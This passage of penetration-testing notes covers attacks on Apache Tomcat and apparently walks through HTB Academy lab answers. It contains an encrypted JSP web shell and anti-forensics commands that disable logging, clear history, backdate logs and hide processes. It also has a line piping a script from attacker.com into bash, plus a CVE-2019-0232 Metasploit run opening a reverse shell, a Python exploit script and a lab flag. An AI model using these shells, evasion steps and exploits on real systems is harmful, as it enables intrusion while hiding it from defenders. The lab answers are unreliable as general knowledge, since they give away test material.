## Defense Evasion and Operational Security

### Anti-Detection Techniques

#### Web Shell Obfuscation
```java
<%@ page import="java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%
// AES encrypted command execution
String encKey = "MySecretKey12345";
String encCmd = request.getParameter("data");

if (encCmd != null) {
    try {
        SecretKeySpec key = new SecretKeySpec(encKey.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, key);
        
        byte[] decrypted = cipher.doFinal(java.util.Base64.getDecoder().decode(encCmd));
        String cmd = new String(decrypted);
        
        Process p = Runtime.getRuntime().exec(cmd);
        // ... command execution logic
        
    } catch (Exception e) {
        response.sendError(500, "Internal Server Error");
    }
}
%>
```

#### Traffic Encryption and Tunneling
```bash
# HTTPS communication (if available)
curl -k "https://target:8443/shell.jsp?cmd=whoami"

# HTTP POST to avoid URL logging
curl -X POST "http://target:8080/shell.jsp" -d "cmd=whoami"

# Base64 encoded commands
cmd_encoded=$(echo "whoami" | base64)
curl "http://target:8080/shell.jsp?cmd=echo+$cmd_encoded|base64+-d|sh"

# User-Agent spoofing
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
     "http://target:8080/shell.jsp?cmd=whoami"
```

### Log Evasion Strategies

#### Tomcat Access Log Manipulation
```bash
# Identify log file locations
curl "http://target:8080/shell.jsp?cmd=find+/opt/tomcat+-name+*access*"

# Check current log configuration
curl "http://target:8080/shell.jsp?cmd=cat+/opt/tomcat/conf/server.xml" | grep -i "AccessLogValve"

# Disable access logging (temporary)
curl "http://target:8080/shell.jsp?cmd=sed+-i+'s/pattern=/#pattern=/g'+/opt/tomcat/conf/server.xml"

# Log rotation and cleanup
curl "http://target:8080/shell.jsp?cmd=logrotate+-f+/etc/logrotate.d/tomcat"
```

#### System Log Evasion
```bash
# Clear command history
curl "http://target:8080/shell.jsp?cmd=history+-c"
curl "http://target:8080/shell.jsp?cmd=unset+HISTFILE"

# Modify timestamps
curl "http://target:8080/shell.jsp?cmd=touch+-t+202301010000+/var/log/auth.log"

# Process hiding techniques
curl "http://target:8080/shell.jsp?cmd=exec+-a+[kworker]+/bin/bash"

# Memory-only execution
curl "http://target:8080/shell.jsp?cmd=curl+http://attacker.com/script.sh|bash"
```

---

## Professional Assessment Integration

### Tomcat Security Assessment Workflow

#### Discovery Phase Integration
- [ ] **Port Scanning** - Identify Tomcat services (8080, 8443, 8009, 8180)
- [ ] **Service Enumeration** - Version detection and component analysis
- [ ] **Directory Discovery** - Manager interfaces and application enumeration
- [ ] **Configuration Analysis** - Default credentials and weak authentication

#### Exploitation Phase Execution
- [ ] **Authentication Bypass** - Brute force attacks and credential testing
- [ ] **WAR File Deployment** - Malicious application upload and execution
- [ ] **Web Shell Establishment** - Persistent backdoor access and command execution
- [ ] **CVE Exploitation** - Ghostcat and version-specific vulnerability abuse

#### Post-Exploitation Activities
- [ ] **System Reconnaissance** - Privilege analysis and network mapping
- [ ] **Persistence Establishment** - Backdoor installation and maintenance
- [ ] **Lateral Movement** - Network traversal and additional system compromise
- [ ] **Data Exfiltration** - Sensitive information gathering and extraction

#### Professional Reporting Considerations
- [ ] **Business Impact Assessment** - Risk evaluation and financial implications
- [ ] **Technical Vulnerability Analysis** - Root cause identification and exploitation vectors
- [ ] **Remediation Recommendations** - Security controls and configuration hardening
- [ ] **Proof of Concept Documentation** - Step-by-step exploitation methodology

---

## Remediation and Hardening

### Tomcat Security Hardening Guide

#### Authentication and Authorization
```xml
<!-- Secure tomcat-users.xml configuration -->
<tomcat-users>
  <!-- Remove default users and weak credentials -->
  <!-- <user username="tomcat" password="tomcat" roles="manager-gui" /> -->
  
  <!-- Use strong, complex passwords -->
  <role rolename="manager-gui" />
  <user username="admin_$(openssl rand -hex 8)" 
        password="$(openssl rand -base64 32)" 
        roles="manager-gui" />
</tomcat-users>

<!-- Implement IP restrictions in context.xml -->
<Context antiResourceLocking="false" privileged="true">
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="192\.168\.1\.\d+|127\.0\.0\.1" />
</Context>
```

#### Network Security Configuration
```xml
<!-- Disable AJP connector if not required -->
<!-- <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /> -->

<!-- Secure AJP configuration if required -->
<Connector port="8009" protocol="AJP/1.3" 
           secretRequired="true" 
           secret="$(openssl rand -base64 32)"
           allowedRequestAttributesPattern=".*" />

<!-- HTTPS-only configuration -->
<Connector port="8443" protocol="org.apache.coyote.http11.Http11NioProtocol"
           maxThreads="150" SSLEnabled="true">
  <SSLHostConfig>
    <Certificate certificateKeystoreFile="conf/localhost-rsa.jks"
                 type="RSA" />
  </SSLHostConfig>
</Connector>
```

### Advanced Security Controls

#### Web Application Security
```bash
# Remove default applications
rm -rf /opt/tomcat/webapps/docs
rm -rf /opt/tomcat/webapps/examples
rm -rf /opt/tomcat/webapps/host-manager
rm -rf /opt/tomcat/webapps/manager  # If not required

# File system permissions
chown -R tomcat:tomcat /opt/tomcat
chmod -R 750 /opt/tomcat
chmod 640 /opt/tomcat/conf/*

# Remove server version disclosure
# Add to server.xml: server="Apache"
```

---

## Tomcat CGI Exploitation (CVE-2019-0232)

 ### Vulnerability Overview

**CVE-2019-0232** represents a **critical remote code execution vulnerability** affecting Tomcat installations on **Windows systems**. This vulnerability exploits **CGI servlet misconfigurations** combined with **Java Runtime Environment command-line argument parsing bugs** to achieve **arbitrary command execution** with **SYSTEM privileges**.

**Technical Details:**
- **Vulnerability Type:** Remote Code Execution (RCE)
- **Affected Versions:** 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, 7.0.0 to 7.0.93
- **Platform:** Windows only
- **Requirement:** `enableCmdLineArguments` enabled on CGI servlet
- **CVSS Score:** 9.8 (Critical)
- **Root Cause:** JRE command-line argument parsing flaw on Windows

### Skills Assessment Walkthrough

#### Question 1: "What vulnerable application is running?"

**Discovery Methodology:**
```bash
# Comprehensive service enumeration
nmap -A -Pn TARGET_IP

# Expected output excerpt:
PORT     STATE SERVICE       VERSION
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Analysis:**
- **Application:** Apache Tomcat
- **Version:** 9.0.0.M1 (vulnerable to CVE-2019-0232)
- **Platform:** Windows (required for exploitation)
- **Attack Vector:** CGI command injection via JRE argument parsing

**Answer:** Apache Tomcat/9.0.0.M1

#### Question 2: "What port is this application running on?"

**Port Discovery:**
```bash
# From Nmap scan results:
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
```

**Answer:** 8080

#### Question 3: "What version of the application is in use?"

**Version Identification:**
```bash
# Multiple sources confirm version:
# 1. HTTP title: Apache Tomcat/9.0.0.M1
# 2. Nmap service detection: Apache Tomcat/Coyote JSP engine 1.1
# 3. HTTP headers reveal version information
```

**Answer:** 9.0.0.M1

#### Question 4: "Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop."

### Complete Exploitation Methodology

#### Step 1: CGI Script Discovery
```bash
# Fuzz for CGI batch files (Windows-specific)
gobuster dir -u http://TARGET_IP:8080/cgi/ \
  -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -x .bat -t 50 -k -q

# Expected findings:
/cmd.bat              (Status: 200) [Size: 0]
/Cmd.bat              (Status: 200) [Size: 0]
```

**Key Discovery Points:**
- **CGI directory** accessible at `/cgi/`
- **Batch files** present (Windows-specific)
- **Case variations** (cmd.bat, Cmd.bat) indicate file system case sensitivity

#### Step 2: Metasploit Exploitation Setup
```bash
# Launch Metasploit Framework
msfconsole -q

# Load CVE-2019-0232 exploit module
use exploit/windows/http/tomcat_cgi_cmdlineargs

# Module configuration
set RHOSTS TARGET_IP
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true

# Verify configuration
show options
```

**Module Parameters Explanation:**
- **RHOSTS:** Target IP address
- **TARGETURI:** Path to vulnerable CGI script
- **LHOST:** Attacker IP for reverse shell
- **FORCEEXPLOIT:** Bypass exploit checks (force execution)

#### Step 3: Exploit Execution
```bash
# Execute the exploit
exploit

# Expected output:
[*] Started reverse TCP handler on 10.10.14.45:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Sending stage (175686 bytes) to TARGET_IP
[*] Command Stager progress - 100.02% done (100692/100668 bytes)
[!] Make sure to manually cleanup the exe generated by the exploit
[*] Meterpreter session 1 opened (10.10.14.45:4444 -> TARGET_IP:49688)
```

#### Step 4: Meterpreter Session Management
```bash
# Verify successful shell establishment
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) >

# System information gathering
sysinfo

# User context verification
getuid

# Process information
ps

# Current working directory
pwd
```

#### Step 5: Flag Retrieval
```bash
# Method 1: Direct Meterpreter file access
cat C:/Users/Administrator/Desktop/flag.txt

# Expected output:
f55763d31a8f63ec935abd07aee5d3d0

# Method 2: System shell access (alternative)
shell
type C:\Users\Administrator\Desktop\flag.txt
exit
```

**Answer:** f55763d31a8f63ec935abd07aee5d3d0

### Alternative Exploitation Methods

#### Manual Command Injection (Educational)
```bash
# Direct URL-based command injection
# Basic test
curl "http://TARGET_IP:8080/cgi/cmd.bat?&dir"

# Whoami execution
curl "http://TARGET_IP:8080/cgi/cmd.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"

# PowerShell reverse shell (URL-encoded)
# Payload: powershell -e <base64_encoded_reverse_shell>
curl "http://TARGET_IP:8080/cgi/cmd.bat?&powershell+-e+<BASE64_PAYLOAD>"
```

#### Python Exploit Script
```python
#!/usr/bin/env python3

import requests
import urllib.parse
import argparse

def exploit_cve_2019_0232(target_url, command):
    """
    CVE-2019-0232 Tomcat CGI Command Injection Exploit
    """
    # URL encode the command
    encoded_cmd = urllib.parse.quote(command, safe='')
    
    # Construct exploit URL
    exploit_url = f"{target_url}?&{encoded_cmd}"
    
    try:
        response = requests.get(exploit_url, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] Command executed successfully:")
            print(response.text)
        else:
            print(f"[-] Exploit failed with status: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")

# Usage example:
# python3 cve_2019_0232.py -u http://target:8080/cgi/cmd.bat -c "c:\windows\system32\whoami.exe"
```

### Technical Analysis

#### Vulnerability Root Cause
```bash
# CVE-2019-0232 Technical Details:
# 1. Windows JRE argument parsing flaw
# 2. CGI servlet enableCmdLineArguments=true
# 3. Query parameters passed as command arguments
# 4. Special character filter bypass via URL encoding
# 5. Command separator (&) enables injection
```

#### Exploitation Requirements
```bash
# Prerequisites for successful exploitation:
# ✓ Windows operating system
# ✓ Tomcat version 9.0.0.M1 to 9.0.17 (or equivalent 8.5.x/7.0.x)
# ✓ CGI servlet enabled with enableCmdLineArguments=true
# ✓ Accessible .bat files in /cgi/ directory
# ✓ Network connectivity to target port (8080)
```

### HTB Academy Lab: CGI Command Injection

**Lab Question:** "After running the URL Encoded 'whoami' payload, what user is tomcat running as?"

#### Step 1: Service Discovery
```bash
# Nmap scan identifies Tomcat
nmap -p- -sC -Pn TARGET --open
# Result: Apache Tomcat/9.0.17 on port 8080
```

#### Step 2: CGI Script Discovery
```bash
# Fuzz for CGI scripts (.bat extension on Windows)
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET:8080/cgi/FUZZ.bat

# Found: welcome.bat
# URL: http://TARGET:8080/cgi/welcome.bat
```

#### Step 3: Command Injection Exploitation
```bash
# Basic test - directory listing
http://TARGET:8080/cgi/welcome.bat?&dir

# Environment variables check
http://TARGET:8080/cgi/welcome.bat?&set

# Whoami command (URL-encoded to bypass filters)
http://TARGET:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

**Key Technical Details:**
- **Command separator:** `&` allows command chaining
- **URL encoding required:** Bypasses Tomcat's special character filter
- **Full path needed:** PATH variable unset in CGI environment
- **Payload:** `c:\windows\system32\whoami.exe` → `c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

**Expected Answer:** User running Tomcat service (typically `nt authority\system` or service account)

#### Attack Mechanism
1. **CGI Servlet** processes query parameters as command arguments
2. **Input validation failure** allows command injection via `&`
3. **URL encoding bypass** defeats special character filters
4. **Arbitrary command execution** with Tomcat service privileges

---

## Next Steps

After mastering Tomcat exploitation:
1. **[Jenkins Discovery & Attacks](jenkins-discovery-attacks.md)** - CI/CD pipeline exploitation
2. **[Java Deserialization Attacks](java-deserialization.md)** - Advanced Java vulnerability analysis
3. **[Spring Boot Security Assessment](spring-boot-security.md)** - Framework-specific exploitation

**💡 Key Takeaway:** Tomcat exploitation represents **one of the highest-impact attack vectors** in enterprise environments, providing **immediate remote code execution** with **frequent SYSTEM/root privileges**. Master **manager interface abuse**, **WAR file deployment**, and **JSP web shell techniques** for **reliable penetration testing success** across **internal and external assessments**.

**⚔️ Professional Impact:** Tomcat compromises often lead to **complete domain takeover** in **Active Directory environments** and **critical data exposure** in **Linux server infrastructures**, making these skills **essential for advanced penetration testing**. 